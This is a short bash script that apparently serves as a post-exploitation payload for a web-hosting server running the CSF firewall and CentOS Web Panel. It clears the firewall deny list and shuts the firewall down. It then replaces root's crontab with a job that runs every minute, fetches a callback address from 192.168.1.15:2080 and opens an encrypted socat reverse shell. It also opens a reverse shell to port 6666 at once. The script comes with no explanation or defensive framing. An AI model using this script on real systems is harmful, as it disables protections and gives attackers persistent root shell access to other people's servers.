#!/bin/bash
$(which cat) /dev/null > /etc/csf/csf.deny
$(which csf) -x & wait
$(which systemctl) stop csf.service & wait
pathenv=$(printenv PATH)
event="DISPLAY=:0\nPATH=\"$pathenv\"\n*/1 * * * * ip=\$(curl -s http://192.168.1.15:2080/ | cut -d '\"' -f 4); port=\$(curl -s http://192.168.1.15:2080/ | cut -d '\"' -f 8); $(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:\$ip:\$port,verify=0"
crontab -u root -l | grep "/usr/local/cwp/php71/bin/php" | crontab -u root -
(crontab -l; printf "$event\n") | crontab -
$(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.1.15:6666,verify=0
